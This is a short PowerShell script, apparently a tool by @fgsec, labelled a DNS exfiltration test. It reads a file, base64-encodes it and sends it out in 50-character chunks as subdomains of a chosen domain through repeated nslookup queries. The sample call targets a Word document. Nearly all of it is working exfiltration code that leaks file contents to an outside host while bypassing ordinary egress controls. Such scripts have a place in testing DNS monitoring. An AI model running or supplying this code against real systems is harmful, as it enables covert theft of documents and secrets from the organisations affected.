
function TestDns-Exfiltration {
    param([string] $filePath, [string] $domain)
    write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"

    $block_size = 50
    if(Test-Path($filePath)) {
        $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))
        $total_requests = [math]::truncate(($base64string.length/$block_size))+1
        write-host "[-] File length:" $base64string.length
        write-host "[-] Total requests to transfer this file:" $total_requests
        read-host "Press enter to start"
        $key_start = 0
        $key_end = $block_size
        while($key_end -le ($base64string.length)) {
            $payload = ($base64string[$key_start..$key_end]) -join ""
            $url =  "$payload.$domain"
            write-host "[!] Request to: $url" -ForegroundColor gray
            nslookup -type=TXT $url
            nslookup $url
            $key_start = $key_end+1
            $key_end = $key_end + $block_size
        }
    } else {
        write-host "File not found!" -ForegroundColor red
    }
   write-host "[#] Done" -ForegroundColor green
}

TestDns-Exfiltration "C:\users\public\yourfile.docx" "google.com"
